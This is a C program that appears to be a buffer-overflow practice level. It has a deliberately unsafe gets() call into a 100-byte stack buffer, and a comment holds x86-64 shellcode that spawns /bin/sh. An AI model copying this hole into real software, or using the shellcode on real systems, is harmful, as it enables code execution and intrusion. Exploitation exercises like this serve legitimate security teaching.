#include <stdio.h>
#include <string.h>

void vuln_func() {
    char buffer[100];  // Larger buffer to fit shellcode
    printf("Enter your input:\n");
    gets(buffer);      
}

int main() {
    printf("Buffer overflow level 3...\n");
    vuln_func();
    printf("Buffer overflow failed. Exiting normally...\n");
    return 0;
}

// Try this payload in the future: 
// "\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"